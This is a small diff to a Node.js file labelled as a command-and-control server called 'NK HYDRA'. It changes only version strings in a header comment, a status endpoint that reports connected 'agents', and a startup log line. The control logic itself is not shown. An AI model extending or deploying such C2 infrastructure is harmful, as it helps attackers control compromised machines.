@@ -1,5 +1,5 @@
-// TYPE: NODE.JS C2 SERVER
-// NK HYDRA v302.0 [TITAN STABLE]
+ // TYPE: NODE.JS C2 SERVER
+// NK HYDRA v303.0 [TITAN STABLE]
 
 const express = require('express');
 const http = require('http');
@@ -9,7 +9,7 @@ const cors = require('cors');
 const app = express();
 app.use(cors());
 
-app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v302.0', agents: agents.length }); });
+app.get('/', (req, res) => { res.json({ status: 'NK_HYDRA_ONLINE', version: 'v303.0', agents: agents.length }); });
 
 const server = http.createServer(app);
 const io = new Server(server, { 
@@ -87,4 +87,4 @@ io.on('connection', (socket) => {
 });
 
 const PORT = process.env.PORT || 3000;
-server.listen(PORT, () => console.log(`HYDRA v302.0 LISTENING ON ${PORT}`));
+server.listen(PORT, () => console.log(`HYDRA v303.0 LISTENING ON ${PORT}`));
